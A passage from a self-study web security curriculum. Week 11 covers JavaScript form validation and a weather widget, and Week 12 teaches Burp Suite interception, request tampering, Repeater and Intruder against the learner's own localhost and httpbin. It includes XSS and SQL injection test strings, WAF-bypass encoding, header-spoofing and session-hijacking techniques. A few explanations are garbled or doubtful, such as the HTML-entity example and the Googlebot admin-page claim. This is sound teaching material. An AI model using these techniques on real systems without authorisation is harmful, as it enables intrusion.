When the user clicks “Send Message” (or submits the form), we intercept the submit event, check: - Name is not empty. - Email matches a basic pattern. - Message is at least 10 characters.

If any check fails, show an error message next to the field. If all pass, we log a success (since there’s no server, we’ll prevent the actual submission and display a thank‑you message).

docs.title: 10.2 HTML Modifications
docs.text:
Add a <div id="form-feedback"></div> at the top or bottom of your form (to show overall success/error) and perhaps small <span class="error"> elements after each input.

Example updated form (inside contact.html):

<form id="contact-form" action="#" method="GET" novalidate>
    <fieldset>
        <legend>Your Details</legend>
        <div class="form-group">
            <label for="name">Name:</label>
            <input type="text" id="name" name="name" required>
            <span class="error" id="name-error"></span>
        </div>
        <div class="form-group">
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>
            <span class="error" id="email-error"></span>
        </div>
    </fieldset>
    <fieldset>
        <legend>Your Message</legend>
        <div class="form-group">
            <label for="subject">Subject:</label>
            <select name="subject" id="subject">
                <option value="general">General Inquiry</option>
                <option value="bug">Bug Report</option>
                <option value="suggestion">Suggestion</option>
            </select>
        </div>
        <div class="form-group">
            <label for="message">Message:</label>
            <textarea id="message" name="message" rows="5" required></textarea>
            <span class="error" id="message-error"></span>
        </div>
        <div class="form-group">
            <input type="checkbox" id="subscribe" name="subscribe" value="yes" checked>
            <label for="subscribe">Subscribe to newsletter</label>
        </div>
    </fieldset>
    <button type="submit">Send Message</button>
    <button type="reset">Clear Form</button>
    <div id="form-feedback"></div>
</form>

Add novalidate to the <form> to disable browser’s built‑in validation (we’ll handle it ourselves). Add a style.css for error messages.

docs.title: 10.3 CSS for Validation
docs.text:
.error {
    color: var(--danger-color, red);
    font-size: 0.85rem;
    display: block;
    margin-top: 0.25rem;
}
.form-group {
    margin-bottom: 1rem;
}
.input-error {
    border: 2px solid red;
}

docs.title: 10.4 The JavaScript Validation
docs.text:
Create script.js (linked with defer at the end of <body>). We’ll write an event listener for the form’s submit event.

"use strict";

document.addEventListener("DOMContentLoaded", function() {
    const form = document.getElementById("contact-form");
    const nameInput = document.getElementById("name");
    const emailInput = document.getElementById("email");
    const messageInput = document.getElementById("message");
    const nameError = document.getElementById("name-error");
    const emailError = document.getElementById("email-error");
    const messageError = document.getElementById("message-error");
    const formFeedback = document.getElementById("form-feedback");

    form.addEventListener("submit", function(event) {
        event.preventDefault(); // stop normal submission
        let isValid = true;

        // Clear previous error states
        nameError.textContent = "";
        emailError.textContent = "";
        messageError.textContent = "";
        nameInput.classList.remove("input-error");
        emailInput.classList.remove("input-error");
        messageInput.classList.remove("input-error");
        formFeedback.textContent = "";

        // Validate name
        if (nameInput.value.trim() === "") {
            nameError.textContent = "Name is required.";
            nameInput.classList.add("input-error");
            isValid = false;
        }

        // Validate email (simple regex)
        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailPattern.test(emailInput.value.trim())) {
            emailError.textContent = "Please enter a valid email address.";
            emailInput.classList.add("input-error");
            isValid = false;
        }

        // Validate message
        if (messageInput.value.trim().length < 10) {
            messageError.textContent = "Message must be at least 10 characters.";
            messageInput.classList.add("input-error");
            isValid = false;
        }

        if (isValid) {
            formFeedback.textContent = "✅ Message sent! (This is a demo – no server)";
            formFeedback.style.color = "green";
            // Optionally, you could clear the form: form.reset();
        } else {
            formFeedback.textContent = "Please correct the errors above.";
            formFeedback.style.color = "red";
        }
    });
});

Test: fill out the form partially, submit, see errors. Fix them, submit again, see success. Check console for any exceptions.

docs.title: 10.5 Improving with Real‑Time Validation
docs.text:
Add input event listeners to clear error when user starts typing:

nameInput.addEventListener("input", () => {
    if (nameInput.value.trim() !== "") {
        nameInput.classList.remove("input-error");
        nameError.textContent = "";
    }
});
// similarly for email and message

This makes the form feel responsive.

docs.title: Part XI – Practical Lab 2: Weather API Widget
docs.text: We’ll add a small weather widget to your homepage. You’ll use the free Open‑Meteo API (no API key required, CORS enabled) to fetch current weather for your city based on latitude/longitude. We’ll display temperature, wind speed, and weather code.

docs.title: 11.1 Getting Coordinates
docs.text:
You can either hard‑code the latitude and longitude of your city (find on Google Maps) or use the browser’s Geolocation API (needs user permission). We’ll use hardcoded for simplicity and add an optional geolocation button.

Coordinates for Nairobi: latitude -1.286389, longitude 36.817223. You can change to your city.

docs.title: 11.2 Open‑Meteo Weather API
docs.text: Endpoint: https://api.open-meteo.com/v1/forecast?latitude=...&longitude=...&current_weather=true Returns JSON with current_weather object containing temperature, windspeed, weathercode.

docs.title: 11.3 Creating the Widget HTML
docs.text:
On index.html, add a section for the weather:

<section class="weather-widget">
    <h2>Current Weather</h2>
    <div id="weather-data">
        <p>Loading...</p>
    </div>
</section>

docs.title: 11.4 Fetch and Display
docs.text:
In script.js, add an async function inside the DOMContentLoaded callback:

async function fetchWeather(lat, lon) {
    const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`;
    try {
        const response = await fetch(url);
        if (!response.ok) throw new Error(`Weather fetch failed: ${response.status}`);
        const data = await response.json();
        return data.current_weather;
    } catch (error) {
        console.error(error);
        return null;
    }
}

function displayWeather(weather) {
    const container = document.getElementById("weather-data");
    if (!weather) {
        container.innerHTML = "<p>Could not load weather.</p>";
        return;
    }
    const temp = weather.temperature;
    const wind = weather.windspeed;
    const weatherCode = weather.weathercode;
    // Map WMO weather codes to simple descriptions
    const weatherDesc = {
        0: "Clear sky",
        1: "Mainly clear",
        2: "Partly cloudy",
        3: "Overcast",
        45: "Fog",
        51: "Drizzle",
        61: "Slight rain",
        71: "Slight snowfall",
        80: "Rain showers",
        95: "Thunderstorm"
    };
    const description = weatherDesc[weatherCode] || `Code ${weatherCode}`;
    container.innerHTML = `
        <p><strong>${temp}°C</strong> – ${description}</p>
        <p>Wind: ${wind} km/h</p>
    `;
}

// Call it with your coordinates (e.g., Nairobi)
fetchWeather(-1.286389, 36.817223).then(displayWeather);

docs.title: 11.5 Adding a Loading Spinner (Optional)
docs.text:
You can show a spinner while fetching:

const container = document.getElementById("weather-data");
container.innerHTML = `<div class="spinner"></div>`;
// after fetch, replace with weather data or error.

Add CSS spinner rules.

docs.title: 11.6 Getting User's Location with Geolocation (Extra Challenge)
docs.text:
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const { latitude, longitude } = position.coords;
            const weather = await fetchWeather(latitude, longitude);
            displayWeather(weather);
        },
        (error) => {
            console.warn("Geolocation failed, using default.");
            fetchWeather(-1.286389, 36.817223).then(displayWeather);
        }
    );
} else {
    // Fallback
    fetchWeather(-1.286389, 36.817223).then(displayWeather);
}

This improves the widget and gives you practice with browser APIs.

docs.title: Part XII – Milestone: An Interactive, Dynamic Portfolio Site
docs.text:
By the end of this week, your portfolio should:

  1. Contact form with full JavaScript validation (real‑time feedback + prevent submission).
  2. Weather widget that fetches live data and displays it in a styled box.
  3. Dark/light toggle still working (from Week 10) – JavaScript already in place.
  4. Responsive layout (CSS from last week) works with new interactive elements.
  5. Console is clean (no errors, use console.log sparingly).
  6. All scripts linked with defer and separated into script.js.

Test everything: - Submit invalid form and see errors appear. - Submit valid form, see success message. - Refresh and check that weather loads (if network available). - Switch theme while errors are displayed – they should still be visible (ensure error classes have appropriate colors in dark mode). Add dark mode variables for .error and .input-error.

docs.title: 12.1 Dark Mode CSS Variables for Validation
docs.text:
In your style.css, ensure the error color uses a variable:

:root { --error-color: #dc3545; }
[data-theme="dark"] { --error-color: #f06548; }
.error { color: var(--error-color); }
.input-error { border-color: var(--error-color); }

docs.title: 12.2 Small Enhancement: Animated Error Messages
docs.text:
Add a transition:

.error { transition: opacity 0.2s; }

You could also slide them in.

docs.title: Part XIII – Week 11 Verification and Self‑Test
13.1 Knowledge Questions
docs.text:
1. What is the difference between null and undefined?
  2. Why do we prefer const and let over var?
  3. What is the difference between == and ===?
  4. What does document.querySelectorAll() return, and how do you iterate over it?
  5. What is the danger of using innerHTML with user‑supplied data?
  6. What does event.preventDefault() do in a form submit handler?
  7. How do you handle errors in a fetch call using async/await?
  8. What is CORS, and why might a fetch request fail because of it?

docs.title: 13.2 Practical Tasks
docs.text:
• Write a script that, on button click, adds a new <li> to a <ul> with the text from an input field.
  • Create a setTimeout that displays a message after 2 seconds and clearTimeout it if a button is clicked.
  • Fetch the data from https://jsonplaceholder.typicode.com/users/1 and display the user’s name and email on the page.
  • In your portfolio, use querySelectorAll to add a click event listener to all navigation links that logs which link was clicked, without adding a separate listener to each (event delegation).

If you can do all that, you have mastered the frontend JavaScript skills that will be the bedrock of your future XSS and advanced exploitation studies.

docs.title: Part XIV – Cheat Sheet for Week 11
docs.text: Concept Syntax / Example Variable let x = 5; const PI = 3.14; Strict equality ===, !== Template literal `Hello ${name}` Arrow function (a,b) => a + b If statement if (x > 0) { ... } else { ... } For loop for (let i=0; i<5; i++) For...of for (const item of arr) Object literal { name: "Ada", greet(){...} } Array methods .push(), .pop(), .map(), .filter(), .forEach() DOM select document.querySelector(".class"), document.getElementById("id") Modify text el.textContent = "New" (use NEVER innerHTML with user data) Change class el.classList.add("active"), .remove(), .toggle() Create element document.createElement("div") → appendChild Event listener el.addEventListener("click", handler) Prevent default event.preventDefault() Fetch GET fetch(url).then(res => res.json()).then(data => ...) Async/await const res = await fetch(url); const data = await res.json(); JSON parse/stringify JSON.parse(str), JSON.stringify(obj) Geolocation navigator.geolocation.getCurrentPosition(success, error)

docs.title: Part XV – What’s Next?
docs.text:
Week 12 is the final week of the first semester. You’ll bring together everything: you’ll take your beautifully styled, interactive portfolio, and you’ll start seeing it as a target. We’ll install Burp Suite and intercept its traffic, set up a local vulnerable app (DVWA) and begin exploring OWASP Top 10 vulnerabilities like SQL injection and XSS—using the very languages and protocols you now understand inside out. Your journey from builder to breaker is about to begin in earnest.

But first, finalise your portfolio. Add comments to your JavaScript explaining each function. Push it to a GitHub repository if you haven’t already. It’s your first major project. In the coming weeks, you’ll attack it, patch it, and learn to think like the adversary.

You are now a frontend developer. Next stop: ethical hacker.

docs.title: Week 12: HTTP Interception & Manipulation with Burp Suite – The Hacker’s Gateway
docs.text:
Welcome to the final week of Semester 1. You’ve built a portfolio from nothing, mastered the command line, scripted in Python, and learned the web’s core languages: HTML, CSS, JavaScript, and HTTP. Now you will step into the traffic itself. This week you’ll install and wield Burp Suite, the industry‑standard intercepting proxy, to see, stop, and modify every HTTP request and response between your browser and any web server. You’ll intercept your own contact form, change data in flight, replay requests, and understand exactly how attackers bypass client‑side validation. This is the bridge from builder to breaker.

We’ll recap HTTP deeply (method‑by‑method, header‑by‑header), then dive into proxy mechanics, set up Burp Suite Community, intercept HTTPS traffic, master the Proxy, Repeater, Decoder, and Intruder (basics), and finally complete the milestone: intercept and alter a login form request (simulated via your portfolio) and explain every byte.

docs.title: Part I – Why Interception? The HTTP Recap and the Attack Mindset
docs.text:
Before we install tools, we must internalise that HTTP is plain‑text, malleable, and inherently untrustworthy. Everything you learned in Week 8—request structure, headers, cookies, encoding—can be altered after it leaves your browser. Client‑side validation is a convenience, never a security control. Attackers bypass it by:

  • Modifying form fields in‑transit (injecting larger values, changing prices, adding admin flags).
  • Replaying requests (buying an item multiple times with the same token, if improperly handled).
  • Changing HTTP methods (a PUT where only GET is expected might bypass authentication).
  • Removing or adding headers (stripping the Referer to defeat CSRF checks, adding X-Forwarded-For to spoof IP).

A proxy sits between your browser and the server, capturing every request and response. You can pause the traffic, edit it, and then release it. Burp Suite does this and provides an arsenal for further manipulation.

docs.title: 2.1 What Is a Proxy?
docs.text: A proxy server acts as a middleman. Your browser connects to the proxy instead of directly to the target server. The proxy forwards requests (possibly after modification) and returns responses (also modifiable). This is exactly how many corporate networks and VPNs work, but for hacking, we use a local intercepting proxy (running on 127.0.0.1) that we can control entirely.

docs.title: 2.2 The Interception Flow
docs.text:
Browser → (configured to use proxy) → Burp Proxy (pauses) → Target Server
Browser ← (configured to use proxy) ← Burp Proxy (pauses) ← Target Server

You can have Burp automatically forward everything (intercept off) or hold each request/response for manual editing (intercept on). This is the core of web application penetration testing.

docs.title: 2.3 Why Not Just DevTools?
docs.text: DevTools let you inspect requests, but they cannot pause and modify live traffic before it reaches the server. You can manipulate the DOM after the fact, but that’s client‑side only. Burp gives you control of the actual bytes on the wire. This is essential for testing server‑side validation.

docs.title: Part III – Setting Up Burp Suite Community
3.1 Installation
docs.text:
Burp Suite Community Edition is free and comes pre‑installed on Kali Linux. On your Ubuntu VM, install it:

sudo apt update
sudo apt install burpsuite

Alternatively, download the latest .sh installer from PortSwigger, make it executable, and run it.

Launch Burp Suite from the terminal or application menu. You’ll see a splash screen; choose Temporary project → Use Burp defaults → Start Burp.

docs.title: 3.2 The Burp Interface
docs.text:
You’ll land on the Dashboard tab. The main tabs you’ll use today: - Proxy – interceptor, HTTP history. - Repeater – manually resend and modify individual requests. - Decoder – encode/decode data. - Intruder – automated customized attacks (rate‑limited in Community).

We’ll focus on Proxy and Repeater.

docs.title: 3.3 Configuring Your Browser to Use Burp
docs.text: Burp’s proxy listener is on 127.0.0.1:8080 by default (check under Proxy → Options → Proxy Listeners). You need to route your browser’s traffic through this port.

docs.title: Option A: Use Firefox’s built‑in proxy settings
docs.text:
• Firefox: Preferences → Network Settings → Manual proxy configuration
  • HTTP Proxy: 127.0.0.1, Port: 8080
  • Check Also use this proxy for HTTPS.
  • OK.

docs.title: Option B: Use a browser extension (easier to toggle)
docs.text: Install FoxyProxy (for Firefox or Chrome). Create a new proxy entry with IP 127.0.0.1 port 8080. Then you can toggle the proxy on/off with a single click.

docs.title: 3.4 Installing Burp’s CA Certificate for HTTPS
docs.text:
To intercept HTTPS traffic, Burp presents its own SSL certificate to the browser, which will warn it’s untrusted. We must install Burp’s CA certificate to avoid these warnings.

  1. With proxy enabled in browser, visit http://burpsuite (or http://127.0.0.1:8080). You should see a Burp welcome page.
  2. Click the CA Certificate link to download cacert.der.
  3. In Firefox:
  4. Go to Preferences → Privacy & Security → Certificates → View Certificates.
  5. Authorities tab → Import. Select the downloaded cacert.der.
  6. Check Trust this CA to identify websites → OK.
  7. In Chrome/Chromium (uses system trust store):
  8. sudo cp cacert.der /usr/local/share/ca-certificates/burp.crt
  9. sudo update-ca-certificates
  10. Restart browser.

Now, when you browse an HTTPS site with the proxy enabled, Burp will decrypt the traffic, and the browser will trust the certificate without warnings. This is crucial for testing any real‑world web app.

docs.title: Part IV – Intercepting HTTP Traffic: Hands‑On
4.1 Setting Intercept On/Off
docs.text:
In Burp, go to the Proxy → Intercept tab. By default, the button says “Intercept is on”. With it on, every request will pause until you click Forward (to send it to the server) or Drop (to discard it).

Try it now: 1. Enable proxy in your browser (FoxyProxy to Burp). 2. Turn on interception in Burp. 3. Open a new tab and navigate to http://example.com. The page will hang. 4. Back in Burp, you’ll see a raw HTTP request like:

GET / HTTP/1.1
Host: example.com
...
  1. Click Forward. The request continues; the response may also be intercepted (if “Intercept responses on” is enabled in Proxy Options; usually off by default). The page loads.
  2. Turn Intercept off (click the button). Now traffic flows freely.

docs.title: 4.2 Inspecting the HTTP History
docs.text:
Every request and response passing through the proxy is logged in Proxy → HTTP history. Here you can: - Filter by host, status code, MIME type, search. - Click any entry to see the raw request and response. - Right‑click to send to Repeater, Intruder, or Scanner.

Exercise: With intercept off, browse http://httpbin.org/get?user=student. Then find that request in HTTP history. Inspect the response body (which echoes your headers).

docs.title: 4.3 Modifying a Request Live
docs.text:
Now the real power: change a request before it reaches the server.

  1. Turn intercept on.
  2. In your browser, go to http://httpbin.org/post – but this page expects a POST, so you’ll manually craft one? No, we can visit the HTML form or use curl. Instead, we’ll modify the GET request to a POST on the fly.
  3. Wait, a simpler demo: visit http://httpbin.org/forms/post which shows a form. Fill it out and submit.
  4. Burp will intercept the POST request. You can now edit any form field: change the custname value, add a new parameter admin=true, modify the User‑Agent header to EvilBot. Then click Forward.
  5. The server responds with a page showing the form data it received—with your modifications. You’ve just bypassed any client‑side restrictions.

Exercise: Intercept your own portfolio’s contact form submission. Change the email to attacker@evil.com while keeping the original name. Forward, see the GET request with modified parameters in the URL.

docs.title: Part V – Burp Suite Tools Deep Dive
5.1 Repeater: Resend and Modify at Will
docs.text:
Repeater lets you take a request, modify it, send it to the server, and view the response, repeatedly. Perfect for manual testing.

How to use: - In HTTP history, right‑click a request → Send to Repeater (or press Ctrl+R). - Go to the Repeater tab. You’ll see the request on the left. - Edit the request directly (add headers, change parameters, change method). - Click Send. The response appears on the right. - You can easily test SQL injection by incrementally adding payloads, modify session cookies, etc.

Example: In Repeater, take the POST request to http://httpbin.org/post. Change the body parameter custname=test to custname=<script>alert(1)</script>. Send. The response echoes the <script> tag. If a real app didn’t escape that, it would be a stored XSS. Repeater lets you test this without filling a form repeatedly.

docs.title: 5.2 Decoder: Encoding/Decoding on the Fly
docs.text:
Decoder (top‑level tab) lets you encode/decode data in various formats: - URL encode/decode - HTML entities - Base64 - Hex, ASCII, binary - Gzip, etc.

Use case: you see a cookie that looks like base64. Copy it to Decoder, select “Decode as Base64”, and read the plain text. Or, you have a payload and need to double‑URL‑encode it to bypass filters.

docs.title: 5.3 Intruder (Basics)
docs.text:
Intruder automates sending many requests with payloads at defined positions. Community Edition is rate‑limited (no automated attack speed), but still useful for learning.

Positions: highlight a part of the request (e.g., a query parameter value) and click Add § to mark it as a payload position. Payloads: supply a list of strings (e.g., numbers 1–100, usernames, SQLi snippets). Attack type: Sniper (one position), Battering ram (same payload in all positions), Pitchfork, Cluster bomb.

We’ll do a simple example: brute‑force a 4‑digit PIN on a test endpoint (use http://httpbin.org/get?code=§§ or a local test app). For now, just know Intruder exists; we’ll revisit heavily in Year 2.

docs.title: Part VI – Practical Lab: Intercepting Your Portfolio’s Contact Form
docs.text: We will now use Burp to attack your own website (running on localhost:8000). This is completely safe and teaches you how both sides work.

docs.title: 6.1 Start Your Local Server
docs.text:
cd ~/portfolio
python3 -m http.server 8000

The simple Python HTTP server doesn’t accept POST requests by default? Actually, it does if you submit to itself; but our form uses GET method. So we’ll just intercept the GET. But to demonstrate a more realistic attack, let’s change the form to POST. In contact.html, change the form method to POST (or leave GET; both work). If you use POST, the Python server will return a 501 error because it doesn't handle POST, but Burp will still show the intercepted request and we can forward it and see the error; the point is interception works.

However, to see a proper server response, we can keep it GET or use http://httpbin.org as target. But the milestone requires intercepting a login form. We don't have a login yet, but we can simulate. So we'll use your contact form as an example.

docs.title: 6.2 Steps
docs.text:
1. Ensure Burp proxy is running and intercept is on.
  2. In Firefox (with FoxyProxy set to Burp), navigate to http://localhost:8000/contact.html.
  3. Fill in the form: Name: Alice, Email: alice@example.com, Message: Hello, this is a test.
  4. Click Send Message. The browser hangs; Burp intercepts the request.
  5. In Burp’s Intercept tab, you’ll see something like:
GET /contact.html?name=Alice&email=alice%40example.com&subject=general&message=Hello%2C+this+is+a+test&subscribe=yes HTTP/1.1
Host: localhost:8000
...

(If you changed to POST, you’ll see POST /contact.html with the body containing the URL‑encoded parameters.)

  1. Modify the request: Change name=Alice to name=Admin and add &admin=true before &subscribe. Change the User-Agent to HackerBrowser/1.0.
  2. Click Forward. The request goes to the server.
  3. The Python server will respond with the contact.html page, but because the form used GET, the query parameters are not processed by the simple static server; the page just loads. But you can see the request in Burp history, with your modifications logged.
  4. To see the effect of modified data, we need a server that echoes the query. Instead, we could use http://httpbin.org/get as the form action temporarily. So for a full demonstration, let’s change the form action to http://httpbin.org/get. Then intercept the request, modify parameters, forward, and the response from httpbin will show exactly what it received.
  5. Do that: edit contact.html action to http://httpbin.org/get. Then repeat the form submission with interception. You’ll see the httpbin response echoing the modified parameters. This is the proof that you can alter data in transit.

docs.title: 6.3 Replaying the Request in Repeater
docs.text: After intercepting (or from history), send the request to Repeater. Modify the parameters and click Send multiple times. See how the server responds each time. No more filling the form; you’re now scripting attacks manually.

docs.title: Part VII – HTTP Deep Dive Revisited Through Burp’s Lens
docs.text: Burp lets you dissect every header and understand their security implications. Let’s revisit key headers and see how an attacker manipulates them.

docs.title: 7.1 Cookies and Session Hijacking
docs.text: When you intercept a request after logging into a site (we’ll use a demo in Year 2), you’ll see a Cookie: session=abc123. If you copy that cookie into another browser or request, you might hijack the session. Burp allows you to take over sessions.

docs.title: 7.2 User‑Agent and Server Fingerprinting
docs.text: Change User-Agent to an old browser or a mobile device. Some sites serve different content (cloaking). Change to Googlebot to see admin‑only pages.

docs.title: 7.3 Referer and Origin
docs.text:
• Referer: page from which the request originated. Often used for CSRF protection. In Burp, you can strip it or set it to the target site to bypass weak checks.
  • Origin: similar but only sent on cross‑origin requests.

docs.title: 7.4 Host Header Attacks
docs.text: The Host header tells the server which domain you’re accessing. If a server hosts multiple virtual hosts, changing this could route you to a different application (or an admin interface). In Repeater, change Host from example.com to admin.example.com and see if you get a different response.

docs.title: 7.5 Content‑Type Confusion
docs.text: Change Content-Type: application/json on a POST that expects URL‑encoded data. The server might parse differently, leading to logic flaws.

docs.title: 7.6 Cache Poisoning via Headers
docs.text: If you control X-Forwarded-Host or X-Forwarded-Scheme, you can poison web caches. Burp lets you add these.

docs.title: 7.7 CORS Headers
docs.text: In responses, look for Access-Control-Allow-Origin: *. That means any script can read the response. Too permissive. In testing, you can replay a request with a custom Origin header and see the response.

docs.title: Part VIII – URL Encoding, Double Encoding, and Advanced Payloads
8.1 URL Encoding Refresh
docs.text: Special characters in URLs must be percent‑encoded: space %20, < %3C, > %3E, # %23, ? %3F. In Burp, if you paste a raw payload into a parameter, you can right‑click and select Convert selection → URL → URL‑encode key characters or URL‑encode all. This is crucial for injection attacks that need to survive decoding layers.

docs.title: 8.2 Double URL Encoding
docs.text: Some servers decode once, then a second time. If a WAF blocks %27 (single quote), try %2527 (percent‑encoded percent). Burp Decoder can build these.

docs.title: 8.3 HTML Encoding
docs.text: If output is inside HTML and you can’t use <script>, use HTML entities like <script>. Burp can encode/decode them.

docs.title: 8.4 Base64 in Authorization Header
docs.text: Basic authentication sends Authorization: Basic base64(username:password). Burp Decoder can decode and encode it. Use this to test default credentials.

docs.title: Part IX – Milestone: Intercept and Modify a “Login” Form (Simulated)
docs.text: To nail the week’s goal, we’ll create a quick dummy login page that prints the username and password, then intercept it with Burp and alter the credentials.

docs.title: 9.1 Create a Simple Login Page
docs.text:
Create login.html in your portfolio directory:

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login Test</title>
</head>
<body>
    <h1>Login</h1>
    <form action="http://httpbin.org/post" method="POST">
        <label>Username: <input type="text" name="username"></label><br>
        <label>Password: <input type="password" name="password"></label><br>
        <input type="submit" value="Log In">
    </form>
</body>
</html>

The form sends a POST to httpbin, which will echo back the submitted data. This perfectly simulates a real login.

docs.title: 9.2 Execution
docs.text:
1. Serve the site: python3 -m http.server 8000 (ensure it’s running).
  2. In Firefox with Burp proxy, navigate to http://localhost:8000/login.html.
  3. Fill in username: bob, password: secret123.
  4. Turn Intercept on.
  5. Click Log In. Burp captures the request.
  6. You will see:
POST /post HTTP/1.1
Host: httpbin.org
...
username=bob&password=secret123
  1. Modify: change bob to admin'-- (classic SQL injection test) and password to anything. Also add a parameter &role=superuser.
  2. Forward the request.
  3. The response from httpbin will show the fields you sent, including your injected admin'--. You’ve successfully tampered with a login request.

Explanation (deliverable for the milestone): Write in your notes exactly what happened step by step, including the raw request and response, the role of the proxy, and why this proves that client‑side JavaScript validation (if any) can be completely bypassed.

docs.title: 9.3 Milestone Deliverable
docs.text: Create a document week12_milestone.md containing: - An annotated raw HTTP request and response from your intercepted login form, with key headers and body explained. - Screenshot or text of the modified request (with changed credentials). - Explanation of how the POST method and Content-Type header inform the server about the body format. - A brief explanation of how this technique could be used to test for SQL injection, privilege escalation, or parameter pollution.

docs.title: Part X – Cheat Sheet for Week 12
docs.text: Tool / Concept Description Burp Proxy listener Default 127.0.0.1:8080 Intercept on/off Button in Proxy → Intercept; paused requests must be forwarded. HTTP history Log of all requests/responses passing through proxy. Send to Repeater Right‑click a request → Send to Repeater for manual resending and editing. Repeater Edit request on left, click Send, view response on right. Decoder Encode/decode URL, HTML, Base64, hex, etc. Intruder (Community) Automated fuzzing with payload positions; rate‑limited. Install Burp CA Visit http://burpsuite with proxy on, download cert, import as trusted CA. Modify request on the fly Turn Intercept on, edit raw request, click Forward. URL‑encode in Burp Select text in request → right‑click → Convert selection → URL. Change User‑Agent Replace the User-Agent header to test server behavior. Replay and automate Use Repeater to repeatedly test variations of a single request. Bypass front‑end validation Intercept form submission, change values, send.

docs.title: Part XI – What’s Next? Year 2: Web Security Foundations
docs.text:
This week concludes the 6‑month foundation. You now have:

  • Linux terminal mastery and scripting (Bandit 0‑20).
  • Python programming (log parser, password checker, Cryptopals).
  • Networking fundamentals (TCP/IP, DNS, DHCP, HTTP).
  • Web development (HTML, CSS, JavaScript, responsive design, forms).
  • Burp Suite interception – the hacker’s essential tool.

In Year 2 (the next 26 weeks), you’ll begin KU Leuven’s Web Security Fundamentals (edX) and University of Helsinki’s Cyber Security Base, while continuing hands‑on labs with DVWA, bWAPP, and PortSwigger’s Web Security Academy. You’ll systematically learn and exploit SQL injection, XSS, CSRF, authentication flaws, and more. The cycle will be: theory → guided lab → CTF challenge.

But this week, enjoy the power of interception. Spend a few hours playing with Burp: intercept traffic from your favorite websites (over plain HTTP, like http://neverssl.com), modify requests, observe the differences. Get comfortable with Repeater. Because from now on, you will always think: “What if I change this parameter?”

Congratulations! You have completed the foundational semester of the Web Exploitation Degree. You are no longer a beginner – you are a junior penetration tester in the making. The next level awaits.
